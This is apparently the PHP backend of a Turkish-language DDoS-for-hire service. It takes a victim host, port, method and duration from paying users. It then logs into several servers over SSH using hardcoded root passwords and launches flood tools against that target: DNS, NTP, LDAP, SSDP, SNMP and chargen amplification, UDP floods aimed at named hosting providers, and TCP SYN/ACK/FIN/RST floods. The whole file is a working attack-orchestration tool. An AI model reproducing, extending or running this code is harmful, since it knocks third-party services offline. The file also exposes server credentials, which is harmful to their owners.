<?php

session_start();
ob_start();


header('Content-Type: application/json');

//ini_set('display_errors', 1);
//error_reporting(-1);

set_include_path(get_include_path() . PATH_SEPARATOR . 'phpseclib');
include('Net/SSH2.php');
include("sql_base.php");

/*
	sunucuya girip setenforce 0 yapmazsan permission denied hatası alırsın.
*/

				$errors = array(
						"Görünüşe göre oturum bilgileriniz silinmiş. Lütfen hesabınıza tekrar giriş yapın."
					   ,"Tüm alanları eksiksiz doldurun."
					   ,"Girdiğiniz saldırı süresi geçersiz. Minimum (1) - Maximum (30) saniye saldırı yapabilirsiniz."
					   ,"Girdiğiniz ip adresi geçersiz."
					   ,"Veritabanı problemi oluştu lütfen sistem yöneticisine bildirin."
					   ,"Devam eden saldırılarınız bitmeden saldırı gönderemezsiniz."

				);

				$email = $_SESSION['email'];
				$pass = $_SESSION['password'];
				$verisorgula = $sql->prepare("SELECT * FROM users WHERE email=? AND password=?");
				$verisorgula->execute(array($email,$pass));

				$veri = $verisorgula->rowCount();
				$user = $verisorgula->fetch(PDO::FETCH_ASSOC);

				date_default_timezone_set('Europe/Istanbul');
				$date = date("d.m.Y H:i:s");
					
				$hubveri = $sql->prepare("SELECT * FROM hub WHERE whoami=? ORDER BY id DESC LIMIT 1");
				$hubveri->execute(array($email));
				$verihub = $hubveri->fetch(PDO::FETCH_ASSOC);
						
				$baslangic		=	strtotime($verihub['date']);
				$bitis			= 	strtotime($date);
				$fark			= 	abs($baslangic-$bitis);



	if($veri == 0 && $errmsg == null){
		
		$errmsg = $errors[0];
		
	}


	extract($_POST);
	
	$host = trim($host);
	$port = trim($port);
	$method = trim($method);
	$time = trim($time);
	$saldirisurem = $user['is_max_boot_time'];
	if($_POST){
	
	if(empty($host) || empty($port) || empty($method) || empty($time) && $errmsg == null){
		$errmsg = $errors[1];
	}
	if($time > $saldirisurem || $time < 1 && $errmsg == null){
		$errmsg = "Min(1)-Max($saldirisurem) saniye saldırı çıkabilirsiniz";
	}
	if($user['is_hub_ban'] == 1 && $errmsg == null){
		$errmsg = "Hesabınız bu bölümde yasaklanmıştır.";
	}
	if($host == "127.0.0.1" && $errmsg == null){
		$errmsg = $errors[3];
	}
	if($host == "116.203.17.236" && $errmsg == null){
		$errmsg = "";
	}
	if($fark < $verihub['time'] && $errmsg == null){
		$errmsg = $errors[5];
	}
	
//	$errmsg = "Api Update Ediliyor.. 15 Dakika İçerisinde Tamamlanacak.";

	
	
	
	if($plan == "vip"){
		
			if($saldirisurem < 120){
				$errmsg = "Hesabınıza tanımlı bir VIP planı bulunamadı.";
			}
			$srv = array(
			"185.22.186.106"		=>	array("root","124578FbFb"),
			"185.22.186.108"		=>	array("root","124578FbFb"),
			"185.22.186.109"		=>	array("root","124578FbFb"),
			"185.22.186.101"		=>	array("root","124578FbFb"),
			"185.22.186.95"			=>	array("root","124578FbFb"),
			"185.22.186.97"			=>	array("root","124578FbFb"),
			"185.22.186.115"		=>	array("root","124578FbFb"),
			"37.148.211.57"			=>	array("root","124578FbFb")
			);
			
	}
	
	if($plan != "vip"){
	
	$gx = rand(1,4);
	
	if($gx == 1){
		
	$srv = array(
	
	"185.22.186.106"	=>	array("root","124578FbFb"),
	"185.22.186.108"	=>	array("root","124578FbFb"),
	"185.22.186.109"	=>	array("root","124578FbFb")
	
	
	);
	
		
	}
	
	if($gx ==2){
		
	$srv = array(
	
	"185.22.186.101"	=>	array("root","124578FbFb"),
	"185.22.186.104"	=>	array("root","124578FbFb"),
	"185.22.186.105"	=>	array("root","124578FbFb")

	
	);
	
	}
	
	
	if($gx ==3){
			$srv = array(
	
	"185.22.186.110"	=>	array("root","124578FbFb"),
	"185.22.186.111"	=>	array("root","124578FbFb"),
	"185.22.186.94"		=>	array("root","124578FbFb")
	
	);
	
	}
	
	
	if($gx == 4){
		
			$srv = array(
	
	"185.22.186.95"	=>	array("root","124578FbFb"),
	"185.22.186.97"	=>	array("root","124578FbFb"),
	"185.22.186.115"=>	array("root","124578FbFb"),
	"37.148.211.57"	=>	array("root","124578FbFb")
	);
	
	
	}
	
	}
	
		
	


	$key = rand(111,999999);
	$keycmd = "screen -AmdS attack$key /var/db/sudo/";
	
	

		
		//AMP METHODLARI
		if($method == "dns"){$cmd="dns $ip $port dnstr.txt 5 -1 $time";}
		if($method == "chargen"){$cmd="chargen $ip $port chargentr.txt 5 -1 $time";}
		if($method == "ssdp"){$cmd="ssdp $ip $port ssdptr.txt 5 -1 $time";}
		if($method == "snmp"){$cmd="snmp $ip $port snmptr.txt 5 -1 $time";}
		if($method == "ldap"){$cmd="ldap $ip $port ldaptr.txt 5 -1 $time";}
		if($method == "ntpv2"){$cmd="ntpv2 $ip $port ntplist.txt 5 -1 $time";}
		
		//UDP METHODLARI
		if($method ==  "88udp"){$cmd = "88udp -r $host -p $port -t $time";}
		if($method == "udpmix"){$cmd = "udpmix $host $port 5 -1 $time . 'TS3INIT1.e'";}
		if($method == "ovhx"){$cmd = "ovhx $host $port 16 $time";}
		if($method == "ovhx2"){$cmd = "ovhx2 $host $port 16 $time";}
		if($method == "judp"){$cmd = "JiexynOld -r $host -p $port -t $time -z 28";}
		if($method == "blazingfast"){ $cmd="udpmix $host 21 10 -1 $time 37.148.209"; }
		if($method == "stormudp"){ $cmd="stormudp -rs -d $host -t $time";   }
	
		//TCP METHODLARI
		if($method == "ack"){$cmd="ack $host $port 5 -1 $time";}
		if($method == "syn"){$cmd="tcpmix $host $port 5 -1 $time syn";}
		if($method == "urg"){$cmd="tcpmix $host $port 5 -1 $time urg";}
		if($method == "fin"){$cmd="tcpmix $host $port 5 -1 $time fin";}
		if($method == "rst"){$cmd="tcpmix $host $port 5 -1 $time rst";}
		
		//ROUTER METHODLARI
		if($method == "router"){$cmd="router.pl $host $port 8 $time";}
		
	if($errmsg == null){
	
	

	
	$hub_add = $sql->prepare("INSERT INTO hub SET ip=?, port=?, time=?, method=?, date=?, whoami=?");
	$add_hub = $hub_add->execute(array($host,$port,$time,$method,$date,$user['email']));
	
	if(!$add_hub && $errmsg == null){
		$errmsg = $errors[4];
	}
	
			$success = array (
			 'status' => "success"
			,'statusText' => "Tebrikler. Saldırı işleminiz başlatıldı."
		);
		
		foreach ($srv as $server=>$serverinfo) {
				$ssh = new Net_SSH2($server);
				$sunucugiris = $ssh->login($serverinfo[0], $serverinfo[1]);
				if(!$sunucugiris){
					$ssh->exit;
					return;
				}
					$ssh->exec("$keycmd$cmd && killall -9 python && exit");
					$ssh->exit;
		}
		
	
		
			echo  json_encode($success);
	
	}else{
		
				$errorr = array (
			 'status' => "error"
			,'statusText' => "$errmsg"
		);
		
		echo  json_encode($errorr);
		
		
		
	}
	
	
}




?>
